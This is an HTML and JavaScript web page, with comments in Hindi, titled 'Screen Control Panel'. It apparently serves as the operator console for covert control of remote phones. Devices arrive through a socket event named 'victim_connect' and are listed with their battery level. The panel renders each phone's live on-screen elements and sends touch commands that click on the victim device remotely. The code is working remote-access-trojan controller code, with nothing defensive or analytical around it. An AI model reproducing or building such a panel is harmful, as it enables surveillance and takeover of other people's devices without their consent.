<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Screen Control Panel</title>
    <style>
        /* Google Fonts से एक साफ-सुथरा फ़ॉन्ट */
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');

        :root {
            --primary-color: #007bff;
            --secondary-color: #6c757d;
            --background-color: #f8f9fa;
            --surface-color: #ffffff;
            --text-color: #212529;
            --border-color: #dee2e6;
            --shadow: 0 4px 8px rgba(0, 0, 0, 0.05);
        }

        body {
            font-family: 'Roboto', sans-serif;
            background-color: var(--background-color);
            margin: 0;
            padding: 20px;
            color: var(--text-color);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .container {
            width: 100%;
            max-width: 1200px;
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
        }

        .card {
            background-color: var(--surface-color);
            border-radius: 12px;
            padding: 20px;
            box-shadow: var(--shadow);
            flex-grow: 1;
        }

        #devices-card {
            flex-basis: 300px;
        }

        #screen-card {
            flex-basis: 400px;
            display: none; /* शुरू में छिपा हुआ */
        }

        h1, h2 {
            margin-top: 0;
            border-bottom: 1px solid var(--border-color);
            padding-bottom: 10px;
            margin-bottom: 20px;
        }

        h1 { text-align: center; width: 100%; margin-bottom: 30px; }

        #device-list {
            list-style-type: none;
            padding: 0;
            margin: 0;
        }

        #device-list li {
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 10px;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.2s;
            border: 1px solid var(--border-color);
        }

        #device-list li:hover {
            background-color: #f1f3f5;
            transform: translateY(-2px);
        }

        #device-list li.active {
            background-color: var(--primary-color);
            color: white;
            font-weight: 500;
            border-color: var(--primary-color);
        }

        #screen-viewport {
            width: 100%;
            max-width: 400px; /* फोन की अधिकतम चौड़ाई */
            margin: auto;
            border: 8px solid #333;
            border-radius: 20px;
            background: #111;
            padding: 2px;
            box-sizing: border-box;
            overflow: hidden; /* यह सुनिश्चित करता है कि स्क्रीन बाहर न निकले */
        }

        #screen {
            position: relative;
            background-color: #000;
            transform-origin: top left;
            /* ऊंचाई और चौड़ाई जावास्क्रिप्ट द्वारा सेट की जाएगी */
        }

        .element {
            position: absolute;
            border: 1px solid rgba(255, 255, 255, 0.3);
            box-sizing: border-box;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 10px;
            text-align: center;
            overflow: hidden;
            white-space: nowrap;
            text-overflow: ellipsis;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .element:hover {
            background-color: rgba(0, 150, 255, 0.4);
        }
        
        .clickable {
            border-color: #00e5ff; /* क्लिक करने योग्य तत्वों के लिए अलग रंग */
        }

        /* क्लिक करने पर फीडबैक एनीमेशन */
        .click-feedback {
            position: absolute;
            border-radius: 50%;
            background-color: rgba(255, 255, 255, 0.7);
            width: 30px;
            height: 30px;
            transform: translate(-50%, -50%) scale(0);
            animation: click-ripple 0.5s ease-out;
        }

        @keyframes click-ripple {
            to {
                transform: translate(-50%, -50%) scale(3);
                opacity: 0;
            }
        }

        /* लोडर एनीमेशन */
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid var(--primary-color);
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 50px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

    </style>
</head>
<body>
    <h1>Screen Control Panel</h1>
    <div class="container">
        <div id="devices-card" class="card">
            <h2>Connected Devices</h2>
            <ul id="device-list"></ul>
        </div>
        <div id="screen-card" class="card">
            <h2 id="current-device-name"></h2>
            <div id="screen-viewport">
                <div id="screen"></div>
            </div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const deviceListEl = document.getElementById('device-list');
        const screenCardEl = document.getElementById('screen-card');
        const screenViewportEl = document.getElementById('screen-viewport');
        const screenEl = document.getElementById('screen');
        const currentDeviceNameEl = document.getElementById('current-device-name');
        
        let activeDeviceId = null;

        socket.on('connect', () => {
            console.log('Panel connected. Requesting device list...');
            socket.emit('admin_join');
        });

        socket.on('victim_connect', (device) => {
            console.log('Received device:', device.deviceName);
            let deviceLi = document.getElementById(device.deviceId);
            if (!deviceLi) {
                deviceLi = document.createElement('li');
                deviceLi.id = device.deviceId;
                deviceListEl.appendChild(deviceLi);
            }
            deviceLi.innerHTML = `<strong>${device.deviceName}</strong><br><small>Battery: ${device.battery || 'N/A'}%</small>`;
            
            deviceLi.onclick = () => {
                if (activeDeviceId === device.deviceId) return;
                activeDeviceId = device.deviceId;
                document.querySelectorAll('#device-list li').forEach(item => item.classList.remove('active'));
                deviceLi.classList.add('active');
                screenCardEl.style.display = 'block';
                currentDeviceNameEl.textContent = `Live Screen: ${device.deviceName}`;
                screenEl.innerHTML = '<div class="loader"></div>';
            };
        });

        socket.on('screen_data', (data) => {
            if (data.deviceId !== activeDeviceId) return;

            screenEl.innerHTML = '';

            const remoteWidth = data.screenWidth;
            const remoteHeight = data.screenHeight;
            const viewportWidth = screenViewportEl.clientWidth;
            
            const scale = viewportWidth / remoteWidth;

            screenEl.style.width = remoteWidth + 'px';
            screenEl.style.height = remoteHeight + 'px';
            screenEl.style.transform = `scale(${scale})`;
            
            // व्यूपोर्ट की ऊंचाई को सही अनुपात में सेट करें
            screenViewportEl.style.height = (remoteHeight * scale) + 'px';

            data.elements.forEach(elem => {
                const div = document.createElement('div');
                div.className = 'element';
                div.style.left = elem.x + 'px';
                div.style.top = elem.y + 'px';
                div.style.width = elem.width + 'px';
                div.style.height = elem.height + 'px';
                
                const fontSize = Math.min(12, elem.height * 0.4);
                div.style.fontSize = fontSize + 'px';
                div.textContent = elem.text || '';

                if (elem.clickable) {
                    div.classList.add('clickable');
                    div.onclick = (event) => {
                        event.stopPropagation();
                        
                        // क्लिक फीडबैक एनीमेशन दिखाएं
                        const ripple = document.createElement('div');
                        ripple.className = 'click-feedback';
                        ripple.style.left = (event.offsetX) + 'px';
                        ripple.style.top = (event.offsetY) + 'px';
                        div.appendChild(ripple);
                        setTimeout(() => ripple.remove(), 500);

                        // क्लिक कमांड भेजें
                        const clickX = elem.x + (elem.width / 2);
                        const clickY = elem.y + (elem.height / 2);
                        
                        socket.emit('touch_command', {
                            deviceId: activeDeviceId,
                            x: Math.round(clickX),
                            y: Math.round(clickY)
                        });
                    };
                }
                screenEl.appendChild(div);
            });
        });

        console.log('Panel script loaded.');
    </script>
</body>
</html>
